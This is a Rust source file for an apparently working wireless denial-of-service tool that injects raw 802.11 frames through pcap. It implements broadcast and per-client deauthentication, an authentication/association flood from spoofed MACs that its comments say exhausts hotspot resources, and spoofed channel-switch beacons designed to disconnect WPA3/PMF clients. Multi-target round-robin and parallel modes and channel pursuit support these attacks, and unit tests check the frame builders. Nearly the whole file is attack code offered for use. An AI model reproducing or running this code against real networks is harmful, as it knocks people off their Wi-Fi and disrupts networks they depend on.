use anyhow::{Context, Result};
#[cfg(all(not(feature = "demo"), target_os = "linux"))]
use pcap::{Capture, Device};
use std::sync::mpsc;
use std::sync::{
    atomic::{AtomicBool, AtomicU16, AtomicU64, Ordering},
    Arc,
};
use std::time::Duration;

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
use crate::types::{Band, DeauthScope};
#[cfg(all(not(feature = "demo"), target_os = "linux"))]
use crate::types::channel_to_freq_mhz;
use crate::types::{AttackCommand, AttackEvent, AttackMode, AttackType, Target};

// ── Shared helpers ────────────────────────────────────────────────────────────

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
struct TargetState {
    bssid: String,
    #[allow(dead_code)]
    ssid: String,
    band: Band,
    channel: u8,
    active: bool,
    deauth_count: u64,
    scope: DeauthScope,
    client_filter: Vec<String>,
}

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
impl TargetState {
    fn from_target(t: &Target) -> Self {
        TargetState {
            bssid: t.bssid.clone(),
            ssid: t.ssid.clone(),
            band: t.band,
            channel: t.channel,
            active: t.active,
            deauth_count: 0,
            scope: DeauthScope::Broadcast,
            client_filter: t.client_filter.clone(),
        }
    }
}

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
fn rebuild_target_states(old: &[TargetState], new_targets: &[Target]) -> Vec<TargetState> {
    new_targets
        .iter()
        .map(|t| {
            let prev = old.iter().find(|s| s.bssid == t.bssid);
            TargetState {
                bssid: t.bssid.clone(),
                ssid: t.ssid.clone(),
                band: t.band,
                channel: t.channel,
                active: t.active,
                deauth_count: prev.map(|s| s.deauth_count).unwrap_or(0),
                scope: prev
                    .map(|s| s.scope.clone())
                    .unwrap_or(DeauthScope::Broadcast),
                client_filter: t.client_filter.clone(),
            }
        })
        .collect()
}

// ── Linux implementation ──────────────────────────────────────────────────────

/// Start the attack orchestrator in a separate thread
#[cfg(all(not(feature = "demo"), target_os = "linux"))]
pub fn start_attack(
    mon_iface: &str,
    targets: Vec<Target>,
    mode: AttackMode,
    attack_type: AttackType,
    burst_size: u16,
    send_interval_ms: u64,
    attack_tx: mpsc::Sender<AttackEvent>,
    cmd_rx: mpsc::Receiver<AttackCommand>,
    running: Arc<AtomicBool>,
) -> Result<std::thread::JoinHandle<()>> {
    let iface = mon_iface.to_string();

    let handle = std::thread::Builder::new()
        .name("attack".into())
        .spawn(move || {
            let mut sender = match open_packet_sender(&iface) {
                Ok(s) => s,
                Err(e) => {
                    let _ = attack_tx.send(AttackEvent::Error(format!(
                        "Failed to open packet sender: {}",
                        e
                    )));
                    return;
                }
            };

            let _ = attack_tx.send(AttackEvent::Error(format!(
                "Attack started: {} {} mode, {} targets",
                attack_type.label(),
                if mode == AttackMode::RoundRobin {
                    "round-robin"
                } else {
                    "parallel"
                },
                targets.len()
            )));

            let mut burst_size = burst_size as usize;
            let mut burst_interval = Duration::from_millis(send_interval_ms);

            let mut target_states: Vec<TargetState> =
                targets.iter().map(TargetState::from_target).collect();
            let mut current_ch = 0u8;
            let mut current_band = Band::TwoGHz;

            match mode {
                AttackMode::RoundRobin => {
                    let mut target_idx = 0;
                    while running.load(Ordering::Relaxed) {
                        // Drain command queue
                        while let Ok(cmd) = cmd_rx.try_recv() {
                            match cmd {
                                AttackCommand::UpdateTargets(new_ts) => {
                                    target_states =
                                        rebuild_target_states(&target_states, &new_ts);
                                    let _ = attack_tx.send(AttackEvent::Error(format!(
                                        "Targets updated: {} active",
                                        target_states.iter().filter(|s| s.active).count()
                                    )));
                                }
                                AttackCommand::UpdateScope(scope) => {
                                    for state in &mut target_states {
                                        state.scope = scope.clone();
                                    }
                                }
                                AttackCommand::UpdateTargetChannel { bssid, channel, band } => {
                                    if let Some(state) = target_states.iter_mut().find(|s| s.bssid == bssid) {
                                        state.channel = channel;
                                        state.band = band;
                                        let _ = attack_tx.send(AttackEvent::Error(format!(
                                            "Pursuit: {} → ch {} {}", bssid, channel, band.label()
                                        )));
                                    }
                                }
                                AttackCommand::UpdateSettings { burst_size: new_b, send_interval_ms: new_i } => {
                                    burst_size = new_b as usize;
                                    burst_interval = Duration::from_millis(new_i);
                                }
                            }
                        }

                        if target_states.is_empty() {
                            std::thread::sleep(Duration::from_millis(100));
                            continue;
                        }

                        let idx = target_idx % target_states.len();

                        if target_states[idx].active {
                            let ch = target_states[idx].channel;
                            let band = target_states[idx].band;
                            let bssid = target_states[idx].bssid.clone();
                            let ssid = target_states[idx].ssid.clone();
                            let scope = target_states[idx].scope.clone();
                            let client_filter = target_states[idx].client_filter.clone();

                            if ch > 0 && (ch != current_ch || band != current_band) {
                                match set_channel(&iface, ch, band) {
                                    Ok(()) => {
                                        current_ch = ch;
                                        current_band = band;
                                    }
                                    Err(e) => {
                                        let _ = attack_tx.send(AttackEvent::Error(format!(
                                            "Attack channel set failed: {}", e
                                        )));
                                    }
                                }
                            }

                            for _ in 0..burst_size {
                                match attack_type {
                                    AttackType::AuthDos => {
                                        send_auth_dos_frame(&mut sender, &bssid, &ssid);
                                    }
                                    AttackType::CsaBeacon => {
                                        let cur = if ch > 0 { ch } else { current_ch };
                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur);
                                    }
                                    AttackType::Deauth => {
                                        if !client_filter.is_empty() {
                                            for mac in &client_filter {
                                                send_client_deauth(&mut sender, &bssid, mac);
                                            }
                                        } else {
                                            match &scope {
                                                DeauthScope::Broadcast => {
                                                    send_deauth_frame(&mut sender, &bssid);
                                                }
                                                DeauthScope::Client { client_mac } => {
                                                    send_client_deauth(&mut sender, &bssid, client_mac);
                                                }
                                            }
                                        }
                                    }
                                }
                                target_states[idx].deauth_count += 1;
                            }

                            let _ = attack_tx.send(AttackEvent::DeauthSent {
                                bssid,
                                count: target_states[idx].deauth_count,
                            });
                        }

                        target_idx += 1;
                        // Pace round-robin bursts by the configured send interval
                        // (UpdateSettings updates burst_interval live).
                        std::thread::sleep(burst_interval);
                    }
                }
                AttackMode::Parallel => {
                    while running.load(Ordering::Relaxed) {
                        // Drain command queue
                        while let Ok(cmd) = cmd_rx.try_recv() {
                            match cmd {
                                AttackCommand::UpdateTargets(new_ts) => {
                                    target_states =
                                        rebuild_target_states(&target_states, &new_ts);
                                    let _ = attack_tx.send(AttackEvent::Error(format!(
                                        "Targets updated: {} active",
                                        target_states.iter().filter(|s| s.active).count()
                                    )));
                                }
                                AttackCommand::UpdateScope(scope) => {
                                    for state in &mut target_states {
                                        state.scope = scope.clone();
                                    }
                                }
                                AttackCommand::UpdateTargetChannel { bssid, channel, band } => {
                                    if let Some(state) = target_states.iter_mut().find(|s| s.bssid == bssid) {
                                        state.channel = channel;
                                        state.band = band;
                                        let _ = attack_tx.send(AttackEvent::Error(format!(
                                            "Pursuit: {} → ch {} {}", bssid, channel, band.label()
                                        )));
                                    }
                                }
                                AttackCommand::UpdateSettings { burst_size: new_b, send_interval_ms: new_i } => {
                                    burst_size = new_b as usize;
                                    burst_interval = Duration::from_millis(new_i);
                                }
                            }
                        }

                        if target_states.is_empty() {
                            std::thread::sleep(Duration::from_millis(100));
                            continue;
                        }

                        for idx in 0..target_states.len() {
                            if !target_states[idx].active {
                                continue;
                            }

                            let ch = target_states[idx].channel;
                            let band = target_states[idx].band;
                            if ch > 0 && (ch != current_ch || band != current_band) {
                                match set_channel(&iface, ch, band) {
                                    Ok(()) => {
                                        current_ch = ch;
                                        current_band = band;
                                    }
                                    Err(e) => {
                                        let _ = attack_tx.send(AttackEvent::Error(format!(
                                            "Attack channel set failed: {}", e
                                        )));
                                    }
                                }
                            }

                            let bssid = target_states[idx].bssid.clone();
                            let ssid = target_states[idx].ssid.clone();
                            let scope = target_states[idx].scope.clone();
                            let client_filter = target_states[idx].client_filter.clone();
                            let ch = target_states[idx].channel;
                            for _ in 0..burst_size {
                                match attack_type {
                                    AttackType::AuthDos => {
                                        send_auth_dos_frame(&mut sender, &bssid, &ssid);
                                    }
                                    AttackType::CsaBeacon => {
                                        let cur = if ch > 0 { ch } else { current_ch };
                                        send_csa_beacon_frame(&mut sender, &bssid, &ssid, cur);
                                    }
                                    AttackType::Deauth => {
                                        if !client_filter.is_empty() {
                                            for mac in &client_filter {
                                                send_client_deauth(&mut sender, &bssid, mac);
                                            }
                                        } else {
                                            match &scope {
                                                DeauthScope::Broadcast => {
                                                    send_deauth_frame(&mut sender, &bssid);
                                                }
                                                DeauthScope::Client { client_mac } => {
                                                    send_client_deauth(&mut sender, &bssid, client_mac);
                                                }
                                            }
                                        }
                                    }
                                }
                                target_states[idx].deauth_count += 1;
                            }
                        }

                        for state in &target_states {
                            if state.active {
                                let _ = attack_tx.send(AttackEvent::DeauthSent {
                                    bssid: state.bssid.clone(),
                                    count: state.deauth_count,
                                });
                            }
                        }

                        std::thread::sleep(burst_interval);
                    }
                }
            }
        })
        .context("Failed to spawn attack thread")?;

    Ok(handle)
}

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
fn set_channel(iface: &str, channel: u8, band: Band) -> Result<()> {
    let freq = channel_to_freq_mhz(channel, band);
    let out = std::process::Command::new("iw")
        .args(["dev", iface, "set", "freq", &freq.to_string()])
        .output()
        .context(format!("Failed to set freq {} MHz on {}", freq, iface))?;
    if !out.status.success() {
        anyhow::bail!(
            "iw set freq {} MHz on {} failed: {}",
            freq,
            iface,
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(())
}

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
fn open_packet_sender(iface: &str) -> Result<pcap::Capture<pcap::Active>> {
    let devices = Device::list().context("Failed to list pcap devices")?;

    let device = devices.iter().find(|d| d.name == *iface);

    let cap = match device {
        Some(dev) => Capture::from_device(dev.name.as_str())
            .context("Failed to create capture device for sending")?
            .promisc(true)
            .snaplen(65535)
            .immediate_mode(true)
            .open()
            .context("Failed to open capture for sending")?,
        None => Capture::from_device(iface)
            .context("Failed to create capture from device name")?
            .promisc(true)
            .snaplen(65535)
            .immediate_mode(true)
            .open()
            .context("Failed to open capture for sending")?,
    };

    Ok(cap)
}

// ── Frame builders (pure, platform-independent → unit-tested) ─────────────────

/// 802.11 sequence-control counter (single attack thread, but atomic to avoid
/// `static mut` UB and stay edition-2024 clean).
static SEQ: AtomicU16 = AtomicU16::new(0);
/// Monotonic counter feeding spoofed source MACs in the auth-flood.
static AUTH_COUNTER: AtomicU64 = AtomicU64::new(0);

fn next_seq() -> u16 {
    SEQ.fetch_add(1, Ordering::Relaxed).wrapping_add(1)
}

/// Radiotap injection header. Sets the TX-flags field with NOACK (0x0008) so
/// the driver does not wait for / retry on ACKs — far more reliable injection
/// across drivers than a bare flags-only header.
fn build_radiotap_header() -> [u8; 12] {
    [
        0x00, 0x00, // version, pad
        0x0C, 0x00, // length = 12
        0x02, 0x80, 0x00, 0x00, // present: Flags (bit1) + TX flags (bit15)
        0x00, // Flags = 0 (frame carries no FCS)
        0x00, // pad — TX flags must be 2-byte aligned
        0x08, 0x00, // TX flags = 0x0008 (NOACK)
    ]
}

fn parse_mac(mac: &str) -> [u8; 6] {
    let mut result = [0u8; 6];
    let parts: Vec<&str> = mac.split(':').collect();
    for i in 0..6.min(parts.len()) {
        if let Ok(b) = u8::from_str_radix(parts[i], 16) {
            result[i] = b;
        }
    }
    result
}

fn wrap_radiotap(frame: &[u8]) -> Vec<u8> {
    let mut packet = Vec::with_capacity(12 + frame.len());
    packet.extend_from_slice(&build_radiotap_header());
    packet.extend_from_slice(frame);
    packet
}

/// Broadcast deauth (reason 0x0007) addressed to all clients of an AP.
pub(crate) fn build_deauth_frame(bssid_str: &str) -> Vec<u8> {
    let bssid = parse_mac(bssid_str);
    let broadcast = [0xFFu8; 6];
    let seq = next_seq();
    let mut frame = Vec::with_capacity(26);
    frame.extend_from_slice(&0x00C0u16.to_le_bytes()); // FC: deauth
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // duration
    frame.extend_from_slice(&broadcast); // DA
    frame.extend_from_slice(&bssid); // SA
    frame.extend_from_slice(&bssid); // BSSID
    frame.extend_from_slice(&seq.to_le_bytes());
    frame.extend_from_slice(&0x0007u16.to_le_bytes()); // reason
    wrap_radiotap(&frame)
}

/// Targeted deauth — kicks one client both directions. Returns (to-client, to-AP).
pub(crate) fn build_client_deauth_frames(ap_bssid: &str, client_mac: &str) -> (Vec<u8>, Vec<u8>) {
    let bssid = parse_mac(ap_bssid);
    let client = parse_mac(client_mac);
    let mk = |da: [u8; 6], sa: [u8; 6]| -> Vec<u8> {
        let seq = next_seq();
        let mut frame = Vec::with_capacity(26);
        frame.extend_from_slice(&0x00C0u16.to_le_bytes());
        frame.extend_from_slice(&0x0000u16.to_le_bytes());
        frame.extend_from_slice(&da);
        frame.extend_from_slice(&sa);
        frame.extend_from_slice(&bssid);
        frame.extend_from_slice(&seq.to_le_bytes());
        frame.extend_from_slice(&0x0007u16.to_le_bytes());
        wrap_radiotap(&frame)
    };
    (mk(client, bssid), mk(bssid, client))
}

/// Next spoofed source MAC for the flood. Locally administered unicast
/// (first byte bit1 set, bit0 clear) so it never collides with a real client.
fn next_spoofed_mac() -> [u8; 6] {
    let c = AUTH_COUNTER.fetch_add(1, Ordering::Relaxed).wrapping_add(1);
    [
        0x02u8,
        ((c >> 32) & 0xFF) as u8,
        ((c >> 24) & 0xFF) as u8,
        ((c >> 16) & 0xFF) as u8,
        ((c >> 8) & 0xFF) as u8,
        (c & 0xFF) as u8,
    ]
}

/// Open-System auth request from `src_mac` to the AP — step 1 of the
/// auth→assoc handshake.
fn build_auth_frame_from(bssid: [u8; 6], src_mac: [u8; 6]) -> Vec<u8> {
    let seq = next_seq();
    let mut frame = Vec::with_capacity(30);
    frame.extend_from_slice(&0x00B0u16.to_le_bytes()); // FC: auth (subtype 11)
    frame.extend_from_slice(&0x013Au16.to_le_bytes()); // duration
    frame.extend_from_slice(&bssid); // DA = AP
    frame.extend_from_slice(&src_mac); // SA = spoofed client
    frame.extend_from_slice(&bssid); // BSSID
    frame.extend_from_slice(&seq.to_le_bytes());
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // algo: Open System
    frame.extend_from_slice(&0x0001u16.to_le_bytes()); // auth seq 1
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // status: success
    wrap_radiotap(&frame)
}

/// Association request from `src_mac` carrying the AP's SSID + a rate set so the
/// AP accepts it and allocates a real association-table slot — step 2 of the
/// handshake and the part that actually exhausts AP/firmware resources (this is
/// what reliably overwhelms a software AP such as an iPhone Personal Hotspot).
fn build_assoc_frame_from(bssid: [u8; 6], src_mac: [u8; 6], ssid: &str) -> Vec<u8> {
    let seq = next_seq();
    let ssid_bytes = ssid.as_bytes();
    let mut frame = Vec::with_capacity(40 + ssid_bytes.len());
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // FC: assoc request (subtype 0)
    frame.extend_from_slice(&0x013Au16.to_le_bytes()); // duration
    frame.extend_from_slice(&bssid); // DA = AP
    frame.extend_from_slice(&src_mac); // SA = spoofed client
    frame.extend_from_slice(&bssid); // BSSID
    frame.extend_from_slice(&seq.to_le_bytes());
    // Fixed params: capability info (ESS + Privacy + Short Preamble + Short Slot).
    frame.extend_from_slice(&0x0431u16.to_le_bytes());
    frame.extend_from_slice(&0x000Au16.to_le_bytes()); // listen interval
    // SSID element (tag 0). Truncated to the 32-byte 802.11 max.
    let ssid_len = ssid_bytes.len().min(32);
    frame.push(0x00);
    frame.push(ssid_len as u8);
    frame.extend_from_slice(&ssid_bytes[..ssid_len]);
    // Supported Rates element (tag 1): 1,2,5.5,11,6,9,12,18 Mbps.
    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]);
    // Extended Supported Rates element (tag 50): 24,36,48,54 Mbps.
    frame.extend_from_slice(&[0x32, 0x04, 0x30, 0x48, 0x60, 0x6c]);
    wrap_radiotap(&frame)
}

/// Auth-flood frame from a spoofed locally-administered MAC. Retained for the
/// unit tests / callers that only need the auth step.
pub(crate) fn build_auth_dos_frame(bssid_str: &str) -> Vec<u8> {
    build_auth_frame_from(parse_mac(bssid_str), next_spoofed_mac())
}

/// Channel a CSA beacon herds victims onto: any channel other than the AP's
/// current one. The client follows the bogus switch, the real AP stays put, so
/// the client lands on a channel where its AP isn't → disconnected.
fn csa_target_channel(cur_channel: u8) -> u8 {
    if cur_channel == 1 { 11 } else { 1 }
}

/// Spoofed beacon for the target BSSID carrying a Channel-Switch-Announcement
/// element. Beacons are NOT protected by 802.11w/PMF, so PMF (WPA3) clients that
/// ignore plaintext deauth still honour this and switch channel — disconnecting
/// them from the real AP. `cur_channel` is the AP's actual channel (advertised
/// in the DS-Param element); the CSA points one channel away.
pub(crate) fn build_csa_beacon_frame(bssid_str: &str, ssid: &str, cur_channel: u8) -> Vec<u8> {
    let bssid = parse_mac(bssid_str);
    let broadcast = [0xFFu8; 6];
    let seq = next_seq();
    let ssid_bytes = ssid.as_bytes();
    let mut frame = Vec::with_capacity(60 + ssid_bytes.len());
    frame.extend_from_slice(&0x0080u16.to_le_bytes()); // FC: beacon (subtype 8)
    frame.extend_from_slice(&0x0000u16.to_le_bytes()); // duration
    frame.extend_from_slice(&broadcast); // DA = broadcast
    frame.extend_from_slice(&bssid); // SA = spoofed AP
    frame.extend_from_slice(&bssid); // BSSID
    frame.extend_from_slice(&seq.to_le_bytes());
    // Fixed beacon params.
    frame.extend_from_slice(&[0u8; 8]); // timestamp
    frame.extend_from_slice(&0x0064u16.to_le_bytes()); // beacon interval 100 TU
    frame.extend_from_slice(&0x0431u16.to_le_bytes()); // capability (ESS+Privacy+short)
    // SSID element (tag 0), truncated to 32 bytes.
    let ssid_len = ssid_bytes.len().min(32);
    frame.push(0x00);
    frame.push(ssid_len as u8);
    frame.extend_from_slice(&ssid_bytes[..ssid_len]);
    // Supported Rates element (tag 1).
    frame.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]);
    // DS Parameter Set (tag 3): the AP's current channel.
    frame.extend_from_slice(&[0x03, 0x01, cur_channel]);
    // Channel Switch Announcement (tag 37): [switch mode, new channel, count].
    //   switch mode 1 = clients stop TX until the switch completes.
    //   count 1 = switch after the next beacon (act immediately).
    frame.extend_from_slice(&[0x25, 0x03, 0x01, csa_target_channel(cur_channel), 0x01]);
    wrap_radiotap(&frame)
}

/// Auth+assoc pair sharing one spoofed MAC — drives the AP through the full
/// association handshake so each fake client consumes a real table slot.
/// Returns (auth, assoc).
pub(crate) fn build_auth_dos_frames(bssid_str: &str, ssid: &str) -> (Vec<u8>, Vec<u8>) {
    let bssid = parse_mac(bssid_str);
    let src_mac = next_spoofed_mac();
    (
        build_auth_frame_from(bssid, src_mac),
        build_assoc_frame_from(bssid, src_mac, ssid),
    )
}

// ── Senders (Linux pcap injection) ────────────────────────────────────────────

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
fn send_deauth_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str) {
    let _ = cap.sendpacket(build_deauth_frame(bssid).as_slice());
}

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
fn send_client_deauth(cap: &mut pcap::Capture<pcap::Active>, ap_bssid: &str, client_mac: &str) {
    let (to_client, to_ap) = build_client_deauth_frames(ap_bssid, client_mac);
    let _ = cap.sendpacket(to_client.as_slice());
    let _ = cap.sendpacket(to_ap.as_slice());
}

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
fn send_auth_dos_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str, ssid: &str) {
    let (auth, assoc) = build_auth_dos_frames(bssid, ssid);
    let _ = cap.sendpacket(auth.as_slice());
    let _ = cap.sendpacket(assoc.as_slice());
}

#[cfg(all(not(feature = "demo"), target_os = "linux"))]
fn send_csa_beacon_frame(cap: &mut pcap::Capture<pcap::Active>, bssid: &str, ssid: &str, cur_channel: u8) {
    let _ = cap.sendpacket(build_csa_beacon_frame(bssid, ssid, cur_channel).as_slice());
}

#[allow(dead_code)]
pub fn reason_code_string(code: u16) -> &'static str {
    match code {
        0x0001 => "Unspecified reason",
        0x0004 => "Disassociated due to inactivity",
        0x0005 => "Disassociated because AP is unable to handle all currently associated STAs",
        0x0006 => "Class 2 frame received from nonauthenticated STA",
        0x0007 => "Class 3 frame received from nonassociated STA",
        0x0008 => "Disassociated because sending STA is leaving BSS",
        0x0009 => "STA requesting (re)association is not authenticated with responding STA",
        _ => "Unknown reason",
    }
}

// ── Demo implementation (--features demo or non-Linux) ───────────────────────

#[cfg(any(feature = "demo", not(target_os = "linux")))]
fn start_attack_demo(
    targets: Vec<Target>,
    mode: AttackMode,
    attack_type: AttackType,
    burst_size: u16,
    send_interval_ms: u64,
    attack_tx: mpsc::Sender<AttackEvent>,
    cmd_rx: mpsc::Receiver<AttackCommand>,
    running: Arc<AtomicBool>,
) -> Result<std::thread::JoinHandle<()>> {
    let handle = std::thread::Builder::new()
        .name("attack-demo".into())
        .spawn(move || {
            let _ = attack_tx.send(AttackEvent::Error(format!(
                "[DEMO] Attack started: {} {} mode, {} targets",
                attack_type.label(),
                if mode == AttackMode::RoundRobin { "round-robin" } else { "parallel" },
                targets.len()
            )));

            // Track deauth counts per BSSID: Vec<(bssid, count)>
            let mut counts: Vec<(String, u64)> = targets
                .iter()
                .map(|t| (t.bssid.clone(), 0u64))
                .collect();
            let mut active: Vec<bool> = targets.iter().map(|t| t.active).collect();

            let mut burst_interval = Duration::from_millis(send_interval_ms);
            let mut burst_size = burst_size as u64;

            while running.load(Ordering::Relaxed) {
                // Drain command queue
                while let Ok(cmd) = cmd_rx.try_recv() {
                    match cmd {
                        AttackCommand::UpdateTargets(new_ts) => {
                            counts = new_ts.iter().map(|t| {
                                let prev = counts.iter().find(|(b, _)| b == &t.bssid)
                                    .map(|(_, c)| *c)
                                    .unwrap_or(0);
                                (t.bssid.clone(), prev)
                            }).collect();
                            active = new_ts.iter().map(|t| t.active).collect();
                            let _ = attack_tx.send(AttackEvent::Error(format!(
                                "[STUB] Targets updated: {} active",
                                active.iter().filter(|&&a| a).count()
                            )));
                        }
                        AttackCommand::UpdateScope(_) => {}
                        AttackCommand::UpdateTargetChannel { bssid, channel, band } => {
                            let _ = attack_tx.send(AttackEvent::Error(format!(
                                "[STUB] Pursuit: {} → ch {} {}", bssid, channel, band.label()
                            )));
                        }
                        AttackCommand::UpdateSettings { burst_size: new_b, send_interval_ms: new_i } => {
                            burst_size = new_b as u64;
                            burst_interval = Duration::from_millis(new_i);
                        }
                    }
                }

                if counts.is_empty() {
                    std::thread::sleep(Duration::from_millis(100));
                    continue;
                }

                for i in 0..counts.len() {
                    if !active.get(i).copied().unwrap_or(false) {
                        continue;
                    }
                    counts[i].1 += burst_size;
                    let _ = attack_tx.send(AttackEvent::DeauthSent {
                        bssid: counts[i].0.clone(),
                        count: counts[i].1,
                    });
                }

                std::thread::sleep(burst_interval);
            }
        })
        .context("Failed to spawn attack demo thread")?;

    Ok(handle)
}

#[cfg(any(feature = "demo", not(target_os = "linux")))]
pub fn start_attack(
    _mon_iface: &str,
    targets: Vec<Target>,
    mode: AttackMode,
    attack_type: AttackType,
    burst_size: u16,
    send_interval_ms: u64,
    attack_tx: mpsc::Sender<AttackEvent>,
    cmd_rx: mpsc::Receiver<AttackCommand>,
    running: Arc<AtomicBool>,
) -> Result<std::thread::JoinHandle<()>> {
    start_attack_demo(targets, mode, attack_type, burst_size, send_interval_ms, attack_tx, cmd_rx, running)
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    const RT: usize = 12; // radiotap header length

    #[test]
    fn radiotap_header_sets_txflags_noack() {
        let h = build_radiotap_header();
        assert_eq!(h.len(), 12);
        assert_eq!(u16::from_le_bytes([h[2], h[3]]), 12); // length field
        assert_eq!(u32::from_le_bytes([h[4], h[5], h[6], h[7]]), 0x0000_8002); // present
        assert_eq!(u16::from_le_bytes([h[10], h[11]]), 0x0008); // TX flags = NOACK
    }

    #[test]
    fn deauth_frame_is_broadcast_with_reason() {
        let p = build_deauth_frame("AA:BB:CC:DD:EE:FF");
        assert_eq!(p.len(), RT + 26);
        assert_eq!(u16::from_le_bytes([p[RT], p[RT + 1]]), 0x00C0); // FC deauth
        assert_eq!(&p[RT + 4..RT + 10], &[0xFF; 6]); // DA broadcast
        assert_eq!(&p[RT + 10..RT + 16], &[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]); // SA=BSSID
        assert_eq!(u16::from_le_bytes([p[RT + 24], p[RT + 25]]), 0x0007); // reason
    }

    #[test]
    fn client_deauth_targets_both_directions() {
        let (to_client, to_ap) =
            build_client_deauth_frames("11:22:33:44:55:66", "AA:BB:CC:DD:EE:FF");
        // to_client: DA = client
        assert_eq!(&to_client[RT + 4..RT + 10], &[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        // to_ap: DA = AP
        assert_eq!(&to_ap[RT + 4..RT + 10], &[0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
    }

    #[test]
    fn auth_dos_uses_locally_administered_src() {
        let p = build_auth_dos_frame("11:22:33:44:55:66");
        assert_eq!(u16::from_le_bytes([p[RT], p[RT + 1]]), 0x00B0); // FC auth
        // SA (spoofed) is at offset RT+10; first byte must be locally administered.
        assert_eq!(p[RT + 10] & 0x03, 0x02);
    }


    #[test]
    fn auth_dos_pair_shares_src_and_carries_ssid() {
        let (auth, assoc) = build_auth_dos_frames("11:22:33:44:55:66", "MyHotspot");
        // Frame 1 is auth, frame 2 is assoc request.
        assert_eq!(u16::from_le_bytes([auth[RT], auth[RT + 1]]), 0x00B0); // FC auth
        assert_eq!(u16::from_le_bytes([assoc[RT], assoc[RT + 1]]), 0x0000); // FC assoc req
        // Both frames use the SAME spoofed, locally-administered source MAC so the
        // AP progresses one fake client through the full auth→assoc handshake.
        assert_eq!(assoc[RT + 10] & 0x03, 0x02);
        assert_eq!(&auth[RT + 10..RT + 16], &assoc[RT + 10..RT + 16]);
        // Assoc body carries the SSID element (tag 0) after the 4-byte fixed params
        // (capability + listen interval) that follow the 24-byte MAC header.
        let ssid_tag = RT + 24 + 4;
        assert_eq!(assoc[ssid_tag], 0x00); // SSID element id
        assert_eq!(assoc[ssid_tag + 1] as usize, "MyHotspot".len());
        assert_eq!(&assoc[ssid_tag + 2..ssid_tag + 2 + 9], b"MyHotspot");
    }

    #[test]
    fn csa_beacon_announces_channel_switch() {
        let p = build_csa_beacon_frame("AA:BB:CC:DD:EE:FF", "Net", 6);
        assert_eq!(u16::from_le_bytes([p[RT], p[RT + 1]]), 0x0080); // FC beacon
        assert_eq!(&p[RT + 4..RT + 10], &[0xFF; 6]); // DA broadcast
        assert_eq!(&p[RT + 10..RT + 16], &[0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]); // SA = AP
        // CSA element (tag 37) must be present and point off the current channel.
        let body = &p[RT..];
        let csa = body
            .windows(2)
            .position(|w| w == [0x25, 0x03])
            .expect("CSA element present");
        assert_eq!(body[csa + 2], 0x01); // switch mode = stop TX
        assert_ne!(body[csa + 3], 6); // new channel ≠ current
        assert_eq!(body[csa + 4], 0x01); // switch count
    }

    #[test]
    fn seq_advances() {
        let a = next_seq();
        let b = next_seq();
        assert_ne!(a, b);
    }
}
